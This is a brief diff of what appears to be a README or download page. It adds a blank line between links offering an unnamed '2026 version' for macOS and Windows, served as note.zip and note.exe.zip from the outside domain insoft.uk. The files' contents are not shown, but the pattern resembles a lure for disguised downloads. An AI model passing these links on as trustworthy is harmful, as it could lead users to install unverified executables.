@@ -1,4 +1,5 @@
 Download the latest 2026 version for macOS <a href="http://insoft.uk/action/?method=downlink&path=macos&file=note.zip">**here**</a> today.
+
 Download the latest 2026 version for Windows <a href="http://insoft.uk/action/?method=downlink&path=pc&file=note.exe.zip">**here**</a> today.
 
 ### Supported File Types
